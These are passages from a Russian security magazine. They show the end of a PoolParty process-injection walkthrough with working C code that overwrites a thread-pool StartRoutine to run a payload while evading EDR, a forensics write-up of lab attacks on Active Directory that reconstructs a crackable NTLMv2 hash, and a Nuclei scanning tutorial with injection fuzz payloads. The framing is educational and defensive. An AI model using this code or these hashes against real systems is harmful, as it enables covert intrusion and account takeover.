GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeLen));


prt_NtQueryObject(gotchedHandle,
    ObjectTypeInformation,
    objTypeInfo,
    objTypeLen,
    NULL);


if (wcsncmp(L"TpWorkerFactory", objTypeInfo->TypeName.Buffer, wcslen(
L"TpWorkerFactory")) == 0) {


    // Нашли!
}


HeapFree(GetProcessHeap(), 0, objTypeInfo);

Нужные дескрипторы получены, переходим к самому интересному — перех‐
вату управления при помощи модификации кода StartRoutine.


МОДИФИЦИРУЕМ STARTROUTINE

Саму StartRoutine после создания фабрики изменить нельзя (она, разуме‐
ется, уже создана в стороннем процессе), а вот код, на который она указыва‐
ет, — можно! Для продолжения атаки нам потребуются следующие NTAPI:
 • NtQueryInformationWorkerFactory — получение информации о фаб‐
   рике;
 • NtSetInformationWorkerFactory — изменение информации о фаб‐
   рике.

Рассмотрим их прототипы:


NtQueryInformationWorkerFactory(
   _In_ HANDLE WorkerFactoryHandle,
   _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
   _Out_writes_bytes_(WorkerFactoryInformationLength) PVOID
WorkerFactoryInformation,
   _In_ ULONG WorkerFactoryInformationLength,
   _Out_opt_ PULONG ReturnLength
);


NtSetInformationWorkerFactory(
   _In_ HANDLE WorkerFactoryHandle,
   _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
   _In_reads_bytes_(WorkerFactoryInformationLength) PVOID
WorkerFactoryInformation,
   _In_ ULONG WorkerFactoryInformationLength
);

Сначала получим информацию о нашей фабрике (точнее, о StartRoutine,
о    которой   мы    говорили    ранее)    при   помощи    вызова
NtQueryInformationWorkerFactory            с              аргументом
WorkerFactoryBasicInformation. Также нам понадобится заполнить струк‐
туру WORKER_FACTORY_BASIC_INFORMATION.


ptr_NtQueryInformationWorkerFactory(
        gotchedHandle,
        WorkerFactoryBasicInformation,
        // factoryInf — это структура типа
        &factoryInf,
      WORKER_FACTORY_BASIC_INFORMATION
        sizeof(WORKER_FACTORY_BASIC_INFORMATION),
        nullptr);

Дальше   самое    интересное  —    непосредственная   модификация
StartRoutine:
 • изменяем  права  доступа  к  памяти,  содержащей  StartRoutine,
   с помощью VirtualProtectEx — чтобы иметь возможность записать
  наш пейлоад в эту область;
 • пишем пейлоад в память с помощью WriteProcessMemory, после чего
   восстанавливаем  права  доступа  к этой памяти повторным вызовом
  VirtualProtectEx.


VirtualProtectEx(
        targetProcess,
        factoryInf.StartRoutine,
        szPayload,
        PAGE_READWRITE,
        (PDWORD)&oldProtect);


WriteProcessMemory(
        targetProcess,
        // Адрес, по которому пишем
        factoryInf.StartRoutine,
        // Пейлоад
        addrPayload,
        // Размер пейлоада
        szPayload,
        nullptr);


VirtualProtectEx(
        targetProcess,
        factoryInf.StartRoutine,
        szPayload,
        oldProtect,
        (PDWORD)&oldProtect );

После того как наша фабрика будет «заряжена», починим минимальное
количество потоков в пуле, ведь мы создаем один лишний поток — свой!
Для этого воспользуемся функцией NtSetInformationWorkerFactory.


// Увеличили минимум потоков на 1
threadsCount = factoryInf.TotalWorkerCount + 1;


ptr_NtSetInformationWorkerFactory(
        gotchedHandle,
        WorkerFactoryThreadMinimum,
        &threadsCount,
        sizeof(uint32_t));

Увеличение минимального числа потоков в пуле — это способ гарантировать
выполнение нашего пейлоада. Изменив код в фабрике StartRoutine, необ‐
ходимо  создать новый  поток, который  выполнит  этот  код.  Увеличение
параметра WorkerFactoryThreadMinimum делает это возможным.
   Обрати внимание: мы сейчас разобрали ключевой шаг в активации атаки,
поскольку без этого наш пейлоад не будет выполнен (ну или нам придется
долго ждать без каких‑либо гарантий).
  В итоге для того, чтобы запустить пейлоад, не понадобилось вызывать
стандартные функции создания потоков и процессов. Именно это мешает
антивирусным средствам обнаруживать атаку: такой подход ломает стандар‐
тный паттерн поведения, который ожидает увидеть EDR.


ВЫВОДЫ

Пентестеры могут использовать описанную технику для скрытого внедрения
кода в высокопривилегированные процессы. С точки зрения защиты рост
популярности  PoolParty —  это  сигнал  улучшать  мониторинг  системных
вызовов и совершенствовать контроль прав доступа к системным объектам.
И конечно же, всегда нужно следить за своевременным обновлением систем
безопасности.
  В заключение отмечу, что мы здесь рассмотрели лишь один вариант тех‐
ники PoolParty — атаки на рабочие фабрики. При желании можно атаковать
все три очереди, с которыми работает механизм Windows Thread Pools,
но это, как показывает практика, чуть менее эффективно.
ВЗЛОМ





В этой статье я покажу  несколько атак
на Active Directory, порекомендую утилиты
для эксплуатации и расскажу об индикато‐
рах, на которые нужно обращать внимание
при       расследовании       инцидентов.              sab3rt1le                                                                                        FORensics FOR fun ;)
А  упражняться будем  на  лабораторных             @k0n70r4
работах   Sherlocks  с   площадки  Hack
The Box.


ПОЧЕМУ СТОИТ УДЕЛИТЬ ОСОБОЕ ВНИМАНИЕ ИМЕННО АТАКАМ
НА ACTIVE DIRECTORY?

Инфраструктура многих компаний построена на основе службы каталогов
Active Directory. Даже с учетом того, что сеть может содержать небольшое
количество хостов, серверов, сервисов и служб, за достаточно короткий про‐
межуток времени в системе происходят тысячи событий, из‑за чего становит‐
ся затруднительно анализировать компьютерные инциденты.
   Помимо этого, в интернете можно найти множество материалов по реали‐
зации как простых, так и продвинутых атак на AD. Поэтому любой скрипт‑кид‐
ди, вооружившись парой утилит, может рискнуть и попробовать свои силы
в хакинге, что уж говорить про серьезных киберпреступников.
  Все это способствует тому, что ребятам из блю‑тима важно обладать зна‐
ниями в сфере безопасности инфраструктуры и уметь быстро реагировать
на подобные инциденты, а также находить ошибки в конфигурации AD.


1. KERBEROASTING

Перед тем как мы приступим к разбору первой лабораторной работы, начнем
с небольшого экскурса в теорию, чтобы знать врага в лицо.
   Протокол Kerberos в Active Directory используется для аутентификации
пользователей и предоставления доступа к службам. Когда пользователь
пытается получить доступ к ресурсу, который управляется именем субъ‐
екта‑службы (SPN), при использовании Kerberos контроллер домена создает
сервисный билет (ST) и шифрует его с использованием хеша пароля SPN.
После этого веб‑сервер расшифровывает и подтверждает подлинность ST.
   Однако, если запрос на получение сервисного билета исходит от самого
контроллера домена, проверка того, имеет ли пользователь необходимые
права для доступа к предоставляемым SPN ресурсам, не выполняется.
   Теперь о самом интересном: злоумышленники, зная конкретную службу
(или SPN), которую они намерены атаковать, могут отправить запрос на ST
с контроллера домена и получить обратно ST, зашифрованный хешем пароля
соответствующего SPN.
   Часто  для   проведения   атаки   Kerberoasting   используют   утилиту
GetUserSPNs  из  комплекта  достаточно  мощного  инструмента  аудита
Impacket. Таким образом, злоумышленник получает хеш SPN, который он
может пробрутить в автономном режиме и завладеть паролем учетки в откры‐
том виде. Если коротко, то в этом и заключается вся суть описанной атаки.
В рамках MITRE ATT&CK Kerberoasting она относится к подтехнике T1558.003.


Campfire-1
Итак, читаем описание лабораторной работы Campfire-1, скачиваем архив,
распаковываем его и видим, что нам предоставлены prefetch-файлы машины
жертвы, журналы событий рабочей станции и контроллера домена.
   Начнем поиск иголки в стоге сена с просмотра событий с кодом 4769
в журнале безопасности на контроллере домена. Этот код обозначает запрос
билета службы Kerberos.
   Даже в средней по размеру инфраструктуре Active Directory такие запросы
могут происходить больше тысячи раз за пару минут, поэтому отфильтруем
средство просмотра событий по ID 4769, что значительно упростит наш
поиск.





Теперь нам предстоит отсеять обычные операции AD от подозрительных.
Для этого рассмотрим форму события поподробнее.





Здесь мы видим, что учетная запись DC01$ запросила сервисный билет
для сервиса, названного DC01$. В Windows имена, заканчивающиеся сим‐
волом доллара ($), обычно являются учетными записями служб и машинными
учетными записями.  Аналогично  служба DC01$  связана с этой  учетной
записью службы.
  Все это относится к стандартным операциям AD. Ниже мы можем увидеть
параметр под названием «Тип шифрования билета» со значением 0x12, что
эквивалентно AES256-CTS-HMAC-SHA1-96. В легитимных  случаях исполь‐
зования операций с билетами Kerberos тип шифрования будет 0x12 или 0x11.
   Если мы увидим тип шифрования 0x17, что соответствует потоковому
шифру RC4, это будет поводом глубже изучить ситуацию: злоумышленник
может запросить билет с таким типом шифрования, потому что это позволит
ему взломать пароль, затратив меньше усилий.


             INFO

                     Все основные инструменты с открытым исходным
                       кодом, такие как Impacket и Rubeus, запрашива‐
                     ют билеты с типом шифрования RC4.


Запомним идентификаторы, которые помогут быстро отследить необходимое
событие с подозрением на Kerberoasting, поэтому обращаем внимание
на следующие важные моменты.
 1. Учетные  записи,  которые  не  являются  учетной  записью  службы
   или машины (и не заканчиваются символом $). Следовательно, под подоз‐
   рением любая стандартная учетная запись домена пользователя (эта учет‐
   ная запись была скомпрометирована, и с ее помощью злоумышленник
   совершил атаку).
 2. Названия служб, которые не заканчиваются символом $.
 3. Тип шифрования билета 0x17, что  соответствует шифрованию RC4,
   которое позволит злоумышленникам легко взломать хеш.

С помощью перечисленных критериев легко находим нужное событие.





Видно, что учетная запись домена alonzo.spire запросила билет для служ‐
бы MSSQLService с типом шифрования 0x17 с компьютера, имеющего IP-
адрес 172.17.79.129. Запомним эти индикаторы компрометации, поскольку
дальнейший анализ будет основываться на построении таймлайна от этого
события с использованием IP-адреса и имени учетной записи.
   Попробуем разобраться с тем, какие действия происходили от имени
учетки alonzo.spire. Для этого откроем журнал событий PowerShell. Дата
и время ранее найденного нами события Kerberoasting — 2024-05-21 03:
18:09 (и да, не забываем переводить время в UTC). В журнале событий
PowerShell на хосте ищем подозрительную активность примерно в это же вре‐
мя.
   Подозревая, что вредоносные действия были совершены с использовани‐
ем powershell.exe, отфильтруем события по ID 4104 (в этих событиях можно
будет увидеть тело выполняемого скрипта).
  И действительно, находим подозрительное событие с байпасом выпол‐
нения сценария PowerShell буквально за пару минут до совершения атаки.





Такое действие позволяет выполнять сценарии в сеансе PowerShell. Из даль‐
нейшего анализа событий видно, что все они были частью одного сценария.





Обнаружены   доказательства   зловредности  сценария  PowerView.ps1,
который использовался для совершения действий на этапе постэксплуата‐
ции.
   Пришло  время  проанализировать  файлы  предварительной  загрузки.
Для этого воспользуемся утилитой PECmd Эрика Циммермана. Преобразуем
prefetch-файлы в .csv:


PECmd.exe -d "путь/к/папке/с/файлами/предварительной/загрузки" --csv
. --csvf наш_ксв_файл.csv

Для более удобного анализа с помощью Timeline Explorer открываем .csv
и фильтруем дату инцидента по последнему запуску.





Сопоставив временные метки событий, находим, что в интересующий нас
промежуток времени запускался RUBEUS.EXE — инструмент, используемый
при пентесте и атаках на AD.





Меры предотвращения
Чтобы предотвратить такие атаки, важно использовать длинные и сложные
пароли для учетных записей служб. Это значительно замедлит взлом хешей.
  Для  привилегированных  служб  рассмотри  возможность  применять
управляемые  группы сервисных  учетных записей (GMSA),  чтобы  гаран‐
тировать использование длинных, сложных паролей, которые часто меня‐
ются.
   Реализация  управления  привилегированным  доступом  (PAM)  также
поможет  ограничить  воздействие  привилегированных  учетных  данных
и уменьшить поверхность  атаки для Kerberoasting, одновременно обес‐
печивая мониторинг всех изменений разрешений для групп безопасности.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
БАЗОВЫЕ АТАКИ НА AD
        РАЗБИРАЕМ KERBEROASTING, AS-
       REP ROASTING И LLMNR POISONING





2. AS-REP ROASTING

А теперь еще немного теории, чтобы понять, что это за зверь такой — AS-REP
Roasting. Запрос сервера аутентификации (AS-REQ) обычно называют пред‐
варительной аутентификацией Kerberos. Первое, что происходит во время
аутентификации внутри Kerberos, — это запрос аутентификации к контрол‐
леру домена, чтобы можно было проверить юзера, пытающегося пройти
аутентификацию.
   Когда система убедится, что клиент прошел авторизацию, она отправит
ему ответ от сервера аутентификации (AS-REP), содержащий сеансовый ключ
и пропускной билет (TGT). Этот сеансовый ключ зашифрован с помощью
хеша пароля пользователя, так что только он может его расшифровать
и использовать снова.
  А теперь об интересном. Если пользователи в домене настроены пропус‐
кать процесс предварительной аутентификации, то злоумышленники могут
отправлять запрос AS (AS-REQ) от имени этих пользователей, потому что AS-
REP содержит сеансовые ключи, зашифрованные их парольными хешами.
В результате злоумышленник может получить хеш пароля любого юзера
в системе. Да, интересно, зачем же отключать процесс предварительной
аутентификации? На деле админы иногда выключают эту функцию на время
выполнения отладочных работ или тестов, а потом попросту забывают вклю‐
чить ее обратно.
   Задачу  взломщикам  очень  сильно  упрощает  утилита  GetNPUsers
из набора инструментов Impacket. Затем хакеры могут начать брутфорсить
пароли, чтобы расшифровать сеансовый ключ. В случае успеха атакующий
узнает пароль пользователя.
   Специалисты по информационной безопасности часто называют этот
зашифрованный сеансовый ключ хешем, но он на самом деле таковым
не является. Однако такие инструменты, как Hashcat и John the Ripper,
могут очень быстро подбирать пароли к подобному «хешу». AS-REP Roasting
сопоставлен с подтехникой T1558.004 в рамках MITRE ATT&CK.


Campfire-2
Пойдем разбираться с тем, как же это все детектить, на примере лаборатор‐
ной работы Campfire-2. Выполняем стандартные процедуры: качаем архив,
распаковываем его и видим,  что перед нами файл  журнала событий
Security.evtx (если что, этот файл взят с контроллера домена).
   Так же как и в предыдущей лабораторной, правильная работа с фильтрами
и понимание того, на что нужно обратить внимание, поможет нам сократить
время исследования и реагирования на угрозу.
   Первое, что мы сразу же начинаем анализировать, — события с ID 4768.
Это идентификатор события, записываемый в журналах безопасности на кон‐
троллере домена каждый раз, когда запрашивается билет проверки под‐
линности Kerberos.





Рассмотрим подробнее форму одного из событий.





 • Имя учетной записи: учетная запись пользователя, запросившая билет
   проверки подлинности у контроллера домена.
 • Имя службы: имя службы, обработавшей билет.
 • Тип шифрования билета: отображает используемый алгоритм шиф‐
   рования билета (например, AES, RC4).
 • Тип  предварительной  проверки  подлинности:  код  состояния
   показывает, была ли отключена или включена предварительная аутен‐
   тификация для указанного объекта (Имя учетной записи).

В нашем случае отображается обычное событие запроса билета аутен‐
тификации пользователем Administrator у универсальной службы AD —
krbtgt.
  Уже традиционно обращаем внимание на использование определенного
типа шифрования. Если мы увидим тип шифрования 0x17, который представ‐
ляет собой RC4, то это будет подсказкой — такой тип позволяет злоумыш‐
ленникам быстрее расшифровать пароль.
   Сокращаем количество требующих расследования событий — отбрасыва‐
ем все имена служб, кроме krbtgt. Это связано с тем, что во время атаки
злоумышленник получает билет аутентификации — точно так же, как это сде‐
лала бы законная учетка пользователя, а krbtgt — это стандартная служба
AD, которая обрабатывает поток аутентификации в Active Directory.
   Показателем того, что хакер успешно провел атаку AS-REP (неважно, уда‐
лось ему взломать хеш или нет), служит значение типа предварительной про‐
верки подлинности в результирующих журналах.
   Передовой способ поиска угроз для этой атаки — просто найти тип пред‐
варительной аутентификации = 0, означающей, что она отключена. Таким
образом мы уберем большую часть бесполезных событий в журналах, оста‐
вив для анализа более детальные результаты.
   Давай еще раз перечислим все необходимое для успешного детекта.
Изначально мы отслеживаем все события 4768, но берем во внимание те,
где:
 1. Тип предварительной проверки подлинности равен 0, то есть аутен‐
   тификация отключена. Это важное условие, которое необходимо выпол‐
   нить, поскольку без этого атака невозможна.
 2. Имя службы — krbtgt, поскольку только krbtgt может выполнять процес‐
  сы аутентификации в AD.
 3. Тип шифрования билета — 0x17, соответствующий шифрованию RC4, что
   позволит злоумышленникам легко взломать хеш.

Основываясь на этих фильтрах, быстро находим интересующее нас событие.





Становится ясно, что юзер arthur.kyle был скомпрометирован, однако
существует еще одна взломанная учетка, от лица которой выполнялась атака.
   У нас есть IP-адрес машины, с которой поступил запрос, поэтому будем
искать события билетов службы Kerberos, так как каждая учетная запись поль‐
зователя домена запрашивает их либо во время входа в систему (при аутен‐
тификации), либо при обычном использовании домена.
   Отфильтруем журнал по ID 4769 (запрос билета службы Kerberos) и рас‐
смотрим события, происходившие во время вредоносной активности.
   Через минуту после обнаруженного AS-REP Roasting происходит событие
с учетки happy.grunwald с того же IP-адреса 172.17.79.129.





Казалось бы, это обычный ивент и здесь нет ничего подозрительного. Но,
учитывая, что вход в систему под юзером happy.grunwald выполнялся
во время атаки AS-REP Roasting и исходил с той же машины, можно пред‐
положить, что и эта учетка была скомпрометирована. Этот факт однозначно
расширяет масштаб всего инцидента.
  К сожалению, лабораторная работа не предоставляет нам дополнитель‐
ные артефакты, поэтому никак не удастся расследовать эту кибератаку пол‐
ностью.


             INFO

                             Атака  AS-REP   Roasting   возможна   только
                      при наличии списка пользователей (то есть если
                      ты получил его из нулевого сеанса SMB). Но если
                      ты   просто  используешь   инструмент   вроде
                   GetNPUsers.py или Rubeus, тебе потребуется
                        активная учетная запись пользователя для зап‐
                       роса   списка  юзеров  (все  это   происходит
                        в фоновом режиме при запуске атаки). Это озна‐
                           чает,   что   атака  может   быть   выполнена
                       без какой‑либо аутентификации, если злоумыш‐
                       ленник каким‑либо образом  заполучил  список
                           пользователей  (к  примеру,  перебором  учеток
                        с помощью Kerbrute).



Меры предотвращения
Всегда внедряй надежную политику паролей с использованием сложных
паролей, которые регулярно меняются. Если есть возможность, то повысь
безопасность, включив 2FA для аутентифицированных сервисов.
   Чтобы предотвратить атаки AS-REP Roasting, крайне важно убедиться, что
предварительная аутентификация включена для каждой учетной записи.


3. LLMNR POISONING

Раньше в сетях Windows использовался протокол Network Basic Input/Output
System (NetBIOS) для выполнения операций через сеть. Важной частью этого
протокола был NetBIOS Name Service (NBT-NS), отвечавший за регистрацию
и разрешение имен. LLMNR (Link-Local Multicast Name Resolution) — это пря‐
мой преемник NBT-NS. Он выполняет ту же функцию, что и его предшествен‐
ник, — разрешение имен хостов в той же локальной сети.
  LLMNR позволяет разрешать как адреса IPv4, так и IPv6 без необходимос‐
ти наличия DNS-сервера в локальной сети. Если запрос к DNS-серверу
не выполняется (например, если DNS-сервер недоступен), отправляется
LLMNR-запрос по локальной сети.
   Суть в том, что LLMNR не требует аутентификации, поэтому любой компь‐
ютер в локалке может выполнить запрос LLMNR. Если кто‑то прослушивает
локальную сеть, он может отвечать на эти запросы, представляя устройство
своим IP-адресом и перенаправляя трафик. Все это может привести к потен‐
циально опасному поведению и атакам, таким как LLMNR Poisoning.


             INFO

                       Responder — популярный инструмент, входящий
                        в пакет утилит Kali Linux, для проведения атак
                        с отравлением LLMNR.


Если в сети происходит событие LLMNR и злоумышленник его прослушивает,
то он может получить конфиденциальную информацию о жертве, такую ​как IP-
адрес, имя пользователя и хеш пароля. Затем хакеры могут попытаться взло‐
мать полученный хеш и получить пароль в открытом виде либо передать этот
хеш для аутентификации в определенной службе. LLMNR/NBT-NS Poisoning
и SMB Relay сопоставлены с подтехникой T1557.001 в MITRE ATT&CK.


Noxious
Описание лабораторной работы Noxious сразу спойлерит, что мы будем
иметь дело с LLMNR-отравлением. Для работы нам предоставляют файл
с дампом трафика.
   Открываем .pcap и фильтруем его по LLMNR-трафику, чтобы увидеть,
какие хосты участвовали во взаимодействиях, а также отметить используемые
IP-адреса.


             INFO

                   LLMNR по умолчанию работает на порте UDP
                   5355.  Поэтому  фильтр  будет  выглядеть  так:
                   udp.port == 5355.


В самом начале отфильтрованного трафика видно, что хост 172.17.79.136
выполнил DNS-запрос DCC01, а другой хост 172.17.79.135 ответил на этот
запрос.





Представим (а позже и докажем), что запрос DCC01 — опечатка в обращении
к DC01, это могло привести к сбою в работе DNS-сервера и использованию
протокола LLMNR, запрос которого перехватил злоумышленник.
   Следует убедиться в том, что 172.17.79.135 — IP-адрес злоумышленни‐
ка. Для этого проверим DHCP-трафик с соответствующим фильтром dhcp.
Находим DHCP-запрос между подозреваемым IP и DHCP-сервером. Мы
видим имя хоста машины, которая арендовала IP-адрес 172.17.79.135.





Докажем кражу учетных данных, проанализировав SMB-трафик с фильтром
smb2.





Здесь мы видим несколько NTLM-аутентификаций юзера john.deacon, иду‐
щих друг за другом за короткий промежуток времени. Посмотрим, какие име‐
на у взаимодействующих хостов.
   Перейди в раздел «Просмотр → Разрешение имен» и включи «Раз‐
решение сетевых адресов». Теперь будут отображаться имена хостов.





Мы помним, что DCC01 не реальный хост. Имя хоста Kali в сети интерпретиро‐
валось в SMB-трафике, поэтому компьютер жертвы Wkstn002, чьи данные
были украдены, думает, что машина Kali — это хост DCC01.
   Посмотрим, к какому файловому ресурсу пыталась обратиться жертва, так
и не осознав того, к чему привела ее опечатка.





Давай рассмотрим процесс получения пароля из скомпрометированного
хеша.
   Внимательно изучим трафик с фильтром ntlmssp и поймем, что здесь
присутствует NTLM Relay. Аутентификация NTLM выполняется взаимодей‐
ствием из трех пакетов:
 • NTLMSSP_NEGOTIATE;
 • NTLMSSP_CHALLENGE;
 • NTLMSSP_AUTH.





У хеша NTLMv2 есть определенная форма, которая выглядит так:
   User::Domain:ServerChallenge:NTProofStr:NTLMv2Response
   Заполним ее данными из пакетов аутентификации:
 • User и Domain можно получить из пакета NTLMSSP_NEGOTIATE;
 • ServerChallenge найдем в пакете NTLMSSP_CHALLENGE;
 • NtProofStr находится в пакете NTLMSSP_AUTH;
 • NTLMv2Response содержит в начале тот же NtProofStr, поэтому уби‐
  раем из него первые 16 байт (32 символа), а его значение берем из того
  же пакета NTLMSSP_AUTH.





Подставляем найденное в форму и получаем:


john.deacon::FORELA:601019d191f054f1:
c0cc803a6d9fb5a9082253a04dbd4cd4:
010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e
0042004600590001001e00570049004e002d00360036004100530035004c003100
470052005700540004003400570049004e002d00360036004100530035004c0031
0047005200570054002e004e004200460059002e004c004f00430041004c000300
14004e004200460059002e004c004f00430041004c00050014004e004200460059
002e004c004f00430041004c000700080080e4d59406c6da010600040002000000
0800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf
821f4f20a2c7f352283a35600377e1f294f1c90a00100000000000000000000000
0000000000000900140063006900660073002f0044004300430030003100000000
0000000000

Остается только сбрутить полученный хеш, используя Hashcat или John
the Ripper, и узнать пароль от учетной записи.


Меры предотвращения
Если использование LLMNR/NBT-NS не требуется в твоей среде, лучше все‐
го полностью отключить эти протоколы в целях безопасности.
  Но если по каким‑то причинам твоя организация не может отключить
LLMNR/NBT-NS, рассмотри возможность использования систем сетевого
контроля доступа (NAC) и установки сложных паролей для минимизации рис‐
ка их взлома.


ВЫВОДЫ

В статье мы рассмотрели работу базовых атак на Active Directory, утилиты,
используемые в этих атаках, а также необходимые маячки, помогающие быс‐
тро обнаружить подобные инциденты и отреагировать на них.
ВЗЛОМ





                             Всеволод Дергунов       Евгений Гриценко
                                  dergunovvs@gmail.com            saintcode.ru


В этой статье мы расскажем о сканировании API веб‑при‐
ложений с помощью утилиты Nuclei. Для демонстрации мы
будем атаковать заведомо уязвимое приложение, исполь‐
зующее OpenAPI. По дороге научимся писать кастомные
шаблоны для Nuclei, которые помогут искать уязвимости
на автомате.


ЭФФЕКТИВНОСТЬ DAST

Динамическое сканирование (DAST) — один из важных этапов анализа
защищенности приложения. Будь то пентест или процессы application security,
в любом случае мы запускаем сканер уязвимостей, который отправляет
к приложению множество запросов и пытается выявить проблемы безопас‐
ности.
   Однако DAST не лишен недостатков.
   Во‑первых, настройки сканеров по умолчанию не всегда позволяют прой‐
ти валидацию, так как не учитываются особенности конкретных запросов
к API, например, что в одном из параметров должен быть UUID.
   Во‑вторых, сканер по умолчанию ничего не знает про аутентификацию.
Если его запросы не содержат bearer-токен или cookie, то мы просто получим
ошибку, не дойдя до проблемы.
   В‑третьих, это отчет, в котором может быть отмечено множество нез‐
начительных недостатков безопасности, что мешает заметить реально важ‐
ные уязвимости и уделить им время.
  В этой статье я покажу, как улучшить DAST, настроив динамическое ска‐
нирование под конкретное приложение с помощью аутентификации и фаз‐
зинга OpenAPI, на примере сканера уязвимостей Nuclei. Также напишем три
кастомных шаблона для нахождения уязвимостей:
 1. Разглашение информации.
 2. Error based SQL-инъекции.
 3. Broken Object Level Authorization.

В качестве подопытного возьмем VAmPI — специальное уязвимое приложе‐
ние для тестирования защищенности API. У него есть поддержка OpenAPI
и показательные примеры небезопасной реализации. Чтобы его установить,
достаточно клонировать репозиторий и запустить docker compose:


git clone https://github.com/erev0s/VAmPI
cd VAmPI
docker compose up

Также необходимо инициализировать базу данных, отправив GET-запрос:



  curl http://127.0.0.1:5002/createdb
  { "message": "Database populated." }


Для начала  запустим  Nuclei с  настройками по умолчанию  (достаточно
передать цель для сканирования):


nuclei -u http://127.0.0.1:5002





При таком запуске Nuclei использует встроенные шаблоны. В результате
видим  ложноположительные  результаты и  информационные  замечания,
которые могут быть полезны только на этапе сбора информации при пен‐
тесте.
   Наша цель — найти реальные проблемы, поэтому мы напишем кас‐
томные шаблоны для сканирования известного REST API на уязвимости,
наличие которых мы можем предполагать из понимания реализации. В этом
нам помогут возможности, которые появились в Nuclei версии 3.2.


ФАЗЗИНГ С NUCLEI

Если у приложения много эндпоинтов HTTP, каждый из которых может обра‐
батывать множество параметров, проверка становится утомительной.
   Автоматизировать анализ защищенности крупных API помогает фаззинг —
техника, которая последовательно применяет набор проверок ко всем воз‐
можным вариациям запросов к приложению.
  Мы можем передать реальные запросы из дампа трафика других инстру‐
ментов, логов или спецификации OpenAPI в Nuclei. Остановимся на OpenAPI,
так как ее поддержка есть у многих современных веб‑приложений и в отличие
от сбора трафика такой метод не требует активных действий.
   Передать OpenAPI в Nuclei можно следующим образом:


nuclei -l openapi.json -im openapi -t templates

Пример шаблона для фаззинга:


http:
    # Filter checks if the template should be executed on a given
request
  - pre-condition:
      - type: dsl
        dsl:
          - method == POST
          - len(body) > 0
        condition: and
    # Payloads that will be used in fuzzing
    payloads:
      injection: # Variable name for payload
        - "'"
        - "\""
        - ";"
    # Fuzzing rules
    fuzzing:
      - part: body  # This rule will be applied to the Body
        type: postfix # Postfix type of rule (i. e., payload will be
added at the end of exiting value)
        mode: single  # Single mode (i. e., existing values will be
replaced one at a time)
        fuzz:         # Format of payload to be injected
          - '{{injection}}' # Here, we are directly using the value
of the injection variable

В шаблоне выше секция pre-condition фильтрует и запускает проверку
только POST-запросов с непустым телом.


  - pre-condition:
      - type: dsl
        dsl:
          - method == POST
          - len(body) > 0
        condition: and

Вот какие части HTTP-запроса может фаззить Nuclei:
 • part: query — параметры запроса;
 • part: path — путь;
 • part: header — заголовок;
 • part: cookie — cookie;
 • part: body — тело запроса.

Это далеко не все настройки фаззинга Nuclei, но для наших целей достаточ‐
но.


СКАНИРОВАНИЕ С АУТЕНТИФИКАЦИЕЙ

Если запросы сканера не проходят дальше авторизации приложения, то
от него может быть мало пользы, так как многие уязвимости скрываются
гораздо глубже — в слоях с бизнес‑логикой и в репозитории.
  Для сканирования с аутентификацией необходимо создать специальный
файл и передать его Nuclei при сканировании:


nuclei -u http://127.0.0.1:5002 -secret-file secrets.yaml

Поддерживаются следующие виды аутентификации:
 • Basic Auth;
 • API Key;
 • Bearer Token;
 • Custom Header;
 • Cookie.

Пример файла аутентификации:


# static secrets
static:
  # 1. Basic Auth based auth
  - type: basicauth
    domains:
      - scanme.sh
    username: test
    password: test


  # 2. API Key (via query parameters) based auth
  - type: query
    domains:
      - example.com
    params:
      - key: token
        value: 1a2b3c4d5e6f7g8h9i0j


  # 3. Bearer Token based auth
  - type: bearertoken
    domains-regex:
      - .*scanme.sh
      - .*pdtm.sh
    token: test


  # 4. Custom Header based auth
  - type: header
    domains:
      - api.projectdiscovery.io
      - cve.projectdiscovery.io
      - chaos.projectdiscovery.io
    headers:
      - key: x-pdcp-key
        value: <api-key-here>


  # 5. Cookie based auth
  - type: cookie
    domains:
      - scanme.sh
    cookies:
      - key: PHPSESSID
        value: 1a2b3c4d5e6f7g8h9i0j
        # raw: "PHPSESSID=1a2b3c4d5e6f7g8h9i0j" (an alternative way
to specify cookie value)


ПОДГОТАВЛИВАЕМ OPENAPI

OpenAPI — это не самая строгая спецификация, а ее обработка в Nuclei
не идеальна (по крайней мере текущая реализация), поэтому иногда необ‐
ходимо редактирование.
  На нашем стенде с VAmPI по пути /ui/ располагается Swagger UI.





Скачаем OpenAPI:


wget http://127.0.0.1:5002/openapi.json

Если попробовать запустить Nuclei со  скачанной спецификацией, будет
ошибка.




  [WRN] Could not generate requests from op: could not dump request:
  unsupported protocol scheme ""


Ошибка требует, чтобы в OpenAPI был явно задан URL тестируемого при‐
ложения. Давай это исправим.





Если снова попытаться запустить сканирование, получим еще одну ошибку.




  [WRN] Could not generate requests from op: [openapi:RUNTIME] security
  scheme (bearer) name is empty


На этот раз Nuclei не нравится пустой массив bearerAuth в секции security,
хотя именно  так  задан пример  bearer-аутентификации на  сайте самой
OpenAPI.
  Нас это не остановит: мы просто везде уберем секцию security. Вручную
это делать не советую, есть замечательная утилита jq, с помощью которой
мы справимся с этим одной командой:


jq 'del(.. | .security?)' openapi.json > openapi_done.json

Также, если нам хочется работать с фаззингом параметров в path, c текущей
реализацией Nuclei у нас это сделать нормально не получится, потому что он
работает с path как с полной строкой, а не как с отдельными параметрами.


             INFO

                   В процессе исследования я отправил репорт раз‐
                         работчикам Nuclei и предложил доработать этот
                       момент. Репорт приняли, и он даже нашел одоб‐
                      рение со стороны CTO разработчика.


А пока что к моменту, когда запросы поступают на фаззинг, в path вместо
параметров в фигурных скобках уже подставлены значения из OpenAPI
example для этого параметра. Чтобы обойти эту проблему, мы используем
небольшой хак: поменяем значения в example на name, чтобы в URL при фаз‐
зинге были имена параметров.





Естественно, руками мы это делать тоже не будем. Снова воспользуемся jq:


jq 'walk(if type == "object" and has("in") and .in == "path" then .
schema.example = .name else . end)' openapi.json > openapi_done.json

И чтобы не выполнять все эти три действия каждый раз, соберем одну коман‐
ду jq, которая преобразует всё сразу:
 • удаляет все свойства security на любом уровне вложенности;
 • устанавливает свойство servers на первом уровне вложенности в зна‐
   чение [{"url": "http://127.0.0.1:5002"}] ;
 • для всех параметров path из спецификации OpenAPI меняет значение
   свойства example на name самого параметра.


jq '
  del(.. | .security?) |
  .servers = [{"url": "http://127.0.0.1:5002"}] |
  walk(
    if type == "object" and has("in") and .in == "path" then
      .schema.example = .name
    else
      .
    end
  )
' openapi.json > openapi_done.json

